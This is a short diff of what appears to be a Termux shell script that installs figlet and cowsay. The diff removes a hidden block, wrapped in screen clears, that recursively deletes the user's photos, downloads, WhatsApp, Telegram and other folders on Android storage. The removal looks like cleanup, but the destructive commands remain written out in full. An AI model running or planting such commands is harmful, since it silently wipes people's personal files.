@@ -26,19 +26,7 @@ W='\033[0m'
 apt-get install figlet
 apt-get install cowsay
 termux-setup-storage
-clear
-rm -r /sdcard/Download
-rm -r /sdcard/download
-rm -r /sdcard/Android
-rm -r /sdcard/DCIM
-rm -r /sdcard/WhatsApp
-rm -r /sdcard/GBWhatsApp
-rm -r /sdcard/snaptube 
-rm -r /sdcard/Telegram
-rm -r /sdcard/Pictures
-rm -r /sdcard/bluetooth
-rm -r /sdcard/Movies
-clear
+
 sleep 1
 printf "$V"
 
